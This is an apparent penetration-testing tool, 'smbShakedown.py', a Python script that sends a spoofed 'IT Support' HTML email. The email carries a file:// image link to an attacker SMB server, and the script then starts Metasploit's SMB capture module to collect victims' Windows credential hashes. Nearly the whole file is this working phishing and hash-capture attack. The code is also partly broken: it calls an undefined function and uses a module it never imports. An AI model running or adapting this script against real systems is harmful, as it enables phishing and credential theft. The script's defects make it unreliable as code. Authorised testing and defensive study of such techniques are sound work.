#/usr/bin/python
# Description: A simplified SMB Email Client Attack script used for External/Internal pentests.
# Created by: Nick Sanzotta / @beamr
# Version: smbShakedown.py v 1.0
import os, smtplib, getpass, readline, socket, time
import urllib, json
rcfile = 'smbServ.rc'


def get_external_address():
	data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
	print("External IP: "+data["ip"])
	return data["ip"]

def get_internal_address():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	print("Internal IP: "+s.getsockname()[0])
	return s.getsockname()[0]

def smbServ():
	smbServOption = raw_input("\nLaunch Metasploit's SMB Capture module?[yes]:") or 'yes'
	choice = smbServOption.lower()
	yes = set(['yes','y', 'ye', ''])
	no = set(['no','n'])
	print('ENTERED: "%s"' % choice + "\n")
	if choice in yes:
		with open(rcfile, 'w') as f1:
			f1.write("use auxiliary/server/capture/smb"+"\n"+\
				"set srvhost "+get_ip_address()+"\n"+\
				"exploit -j -z")
		os.system('msfconsole -q -r smbServ.rc')
	elif choice in no:
		print("Ok, remember to setup your SMBCapture Server elsewhere. \n")

	else:
		sys.stdout.write("Please respond with 'yes' or 'no'")



def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAddress, recipientAddress, emailMessage):
	smtpserver = smtplib.SMTP(smtpServerAddress, smtpServerPort)
	smtpserver.ehlo()
	smtpserver.starttls()
	smtpserver.ehlo
	smtpserver.login(smtpUser, smtpPassword)
	print("Testing Connection to your SMTP Server...")
	time.sleep(1)
	try:
		status = smtpserver.noop()[0]
		print("SMTP Server Status: ",status)
		sendOption = raw_input("Connection to SMTP Server is successful, would you like to send mail now?[yes]:") or 'yes'
		choice = sendOption.lower()
		yes = set(['yes','y', 'ye', ''])
		no = set(['no','n'])
		print('ENTERED: "%s"' % choice + "\n")
		if choice in yes:
			smtpserver.sendmail(senderAddress, recipientAddress, emailMessage)
			print("Message(s) sent!")
			#SMTP close/quit
			smtpserver.quit()
			return True
		elif choice in no:
			#SMTP close/quit
			smtpserver.quit()
			print("Ok no mail sent.")
			return False
		else:
			sys.stdout.write("Please respond with 'yes' or 'no'")
	except:
		status = -1
		print("[Aborting]SMTP Server Status: ",status)
	return True if status == 250 else False

def main():
	# In progress
	extipAddress = get_external_address()
	ipAddress = get_internal_address()
	print("\n")

	# In progress
	# serverOption = raw_input('Use Smarthost or localhost SMTP Server?[smarthost/localhost]: ') or 'smarthost'
	# choice = serverOption.lower()
	# smarthost = set(['smarthost','smart', 's', ''])
	# localhost = set(['localhost','local', 'l'])
	smtpServerAddress = raw_input('Enter SMTP Server address[smtp.gmail.com]: ') or 'smtp.gmail.com'
	print('ENTERED: "%s"' % smtpServerAddress + "\n")
	smtpServerPort = raw_input('Enter your SMTP Server Port[587]: ') or 587
	print('ENTERED: "%s"' % smtpServerPort + "\n")
	smtpUser = raw_input('Enter SMTP Server username[user@gmail.com]: ')
	print('ENTERED: "%s"' % smtpUser + "\n")
	smtpPassword = getpass.getpass(r'Enter SMTP Server password: ')
	print("\n")
	smbCaptureServer = raw_input('Enter SMB Capture Server IP address['+ipAddress+']: ') or  ipAddress
	print('ENTERED:' "%s" % smbCaptureServer + "\n")
	senderName = raw_input('Enter "from name":[IT Support]') or  'IT Support'
	print('ENTERED:' "%s" % senderName + "\n")
	senderAddress = raw_input('Enter "from address":[itsupport@company.com]') or  'itsupport@company.com'
	print('ENTERED:' "%s" % senderAddress + "\n")
	recipientName = raw_input('Enter recipient(s) name[Bob]: ')
	print('ENTERED:' "%s" % recipientName + "\n")
	recipientAddress = raw_input('Enter recipient(s) address[bob@company.com]: ')
	print('ENTERED:' "%s" % recipientAddress + "\n")


### Email Message Template Below, Customize as Needed ###
	message = """From: {0} <{1}>
To: {2} <{3}>
MIME-Version: 1.0
Content-type: text/html
Subject: smbShakedown.py test.


...
<b>smbShakedown.py test message.</b>
<br>
<img src=file://{4}/image/foo.gif>
"""
##########################################################
	emailMessage = message.format(senderName, senderAddress, recipientName, recipientAddress, ipAddress)
	print('Email Message Template Below:')
	time.sleep(1)
	print(emailMessage)
	smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAddress, recipientAddress, emailMessage)
	time.sleep(1)
	smbServ()
if __name__ == "__main__":
	main()
